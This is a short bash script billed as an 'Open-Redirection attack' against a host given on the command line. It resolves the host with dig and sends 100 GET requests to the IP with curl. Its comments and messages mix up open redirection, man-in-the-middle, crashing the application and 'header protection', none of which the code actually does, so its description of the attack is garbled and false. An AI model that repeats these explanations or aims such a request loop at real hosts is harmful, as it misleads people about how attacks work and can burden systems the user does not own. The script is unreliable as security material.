#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting Open-Redirection attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

# create a redirection system
IP=$(dig +short "$HOST")

sleep 5s;

# bind to listen and redirect
size=${#IP}
if [ "$size" -gt 5 ]
then
  echo "Bound to crash the application ..."
  # make a loop to perform OR attack as a client
  for _ in {1..100}
  do
    TMP=$(curl -X GET "$IP")
    echo Got: "$TMP"
  done

  exit 0;
else
  echo "MITM failed due to high protection of headers!"
  exit 1;
fi
